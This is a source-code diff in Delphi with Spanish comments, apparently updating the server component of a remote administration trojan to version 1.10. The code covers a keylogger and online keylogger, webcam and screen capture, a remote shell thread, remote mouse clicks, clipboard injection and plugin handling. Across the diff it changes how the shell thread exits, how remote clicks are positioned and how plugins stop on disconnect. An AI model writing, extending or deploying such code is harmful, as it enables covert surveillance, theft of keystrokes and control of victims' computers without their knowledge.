@@ -129,9 +129,11 @@ begin
   KeepAliveTimer(25000);
   while (GetMessage(Msg, 0, 0, 0)) do
     begin
+      if ThreadStarted then break; //Se ha iniciado el keylogger, él se encargará de los mensajes
       TranslateMessage(Msg);
       DispatchMessage(Msg);
     end;
+  while true do sleep(1000);
 end;
 
 function leer(s: TClientSocket): AnsiString;
@@ -271,6 +273,9 @@ begin
                   //SendText('MSG|Adiós!');
                   //Halt;
                   DesactivarWebcams();
+                  if ShellThreadID <> 0 then
+                    PostThreadMessage(ShellThreadID, WM_ACTIVATE, Length('exit'),DWord(PChar('exit')));
+                  sleep(1000);
                   ExitProcess(0);
                 end;
 
@@ -287,7 +292,11 @@ begin
                   if ShellExecute(0, 'open', PChar(ParamStr(0)), '' {sin parametros},
                     PChar(ExtractFilePath(ParamStr(0))), SW_NORMAL) > 32 then
                     begin
+                      if ShellThreadID <> 0 then
+                        PostThreadMessage(ShellThreadID, WM_ACTIVATE, Length('exit'),
+                      DWord(PChar('exit')));
                       DesactivarWebcams();
+                      sleep(1000);
                       ExitProcess(0);
                     end
                   else
@@ -871,15 +880,15 @@ begin
               Delete(Recibido, 1, Pos('|', Recibido));
               if TempStr2 = 'CLICKIZQ' then
                 begin
+                  SetCursorPos(StrToInt(TempStr), StrToInt(TempStr1));
                   mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
                   mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
-                  SetCursorPos(StrToInt(TempStr), StrToInt(TempStr1));
                 end
               else if TempStr2 = 'CLICKDER' then
                 begin
+                  SetCursorPos(StrToInt(TempStr), StrToInt(TempStr1));
                   mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
                   mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
-                  SetCursorPos(StrToInt(TempStr), StrToInt(TempStr1));
                 end;
             end;
 
@@ -1135,6 +1144,8 @@ begin
             begin
               Delete(Recibido, 1, 8);
               //Cambiamos los |saltos| por saltos de línea
+              Recibido := StringReplace((Recibido),'|salto|', #10, [rfReplaceAll]);
+              Recibido := StringReplace((Recibido),'|salto2|', #13, [rfReplaceAll]);
               TempStr := '';
               TempStr := Recibido;
               SetClipBoardDatas(PChar(TempStr));
@@ -1241,6 +1252,10 @@ begin
       //Estamos desconectados así que tenemos que desactivar la webcam y el online keylogger
       //La shell se desactiva automaticamente
 
+      for i := 0 to Plugincount do
+        if Plugins[i].StopDef then
+          Plugins[i].Stop();
+          
       SetOnlineKeylogger(False, nil); //Desactivamos online keylogger
       CapturaWebcam := '';
       CapturaPantalla := '';
@@ -1268,7 +1283,7 @@ begin
   Configuracion := TSettings(P^); //Leemos la configuración que nos han mandado
   if not Configuracion.bCopiarArchivo then
     Configuracion.sCopyTo := extractfilepath(paramstr(0));
-  VersionDelServer := '1.9';
+  VersionDelServer := '1.10';
   BeginThread(nil, 0, Addr(KeepAliveThread), nil, 0, id1);
   OnServerInitKeylogger(); //Función que inicia el keylogger en caso de que se haya iniciado antes desde el cliente o en el futuro si la configuración lo marca
   CargarPluginsDeInicio();
